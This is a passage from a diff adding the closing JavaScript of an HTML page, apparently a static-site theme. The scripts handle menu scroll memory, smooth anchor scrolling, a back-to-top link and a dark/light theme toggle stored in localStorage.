+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
